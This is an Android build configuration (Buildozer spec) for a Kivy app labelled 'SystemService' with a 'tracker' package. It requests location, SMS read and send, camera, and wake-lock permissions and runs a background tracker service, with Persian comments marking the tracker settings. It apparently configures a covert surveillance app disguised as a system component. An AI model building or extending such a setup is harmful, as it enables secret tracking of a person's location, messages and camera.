[app]
title = SystemService
package.name = trackerclient
package.domain = com.tracker.client

source.dir = .
source.include_exts = py,png,jpg,kv,atlas

version = 0.1

requirements = python3,kivy,plyer,requests,urllib3,certifi,android

orientation = portrait
fullscreen = 0
android.archs = arm64-v8a, armeabi-v7a

# --- بخش حیاتی برای ردیاب ---
android.permissions = INTERNET, ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION, READ_SMS, SEND_SMS, CAMERA, FOREGROUND_SERVICE, WAKE_LOCK

# فعال کردن سرویس پس‌زمینه
android.services = tracker_service:service

# تنظیمات برای اندرویدهای جدید
android.api = 33
android.minapi = 21
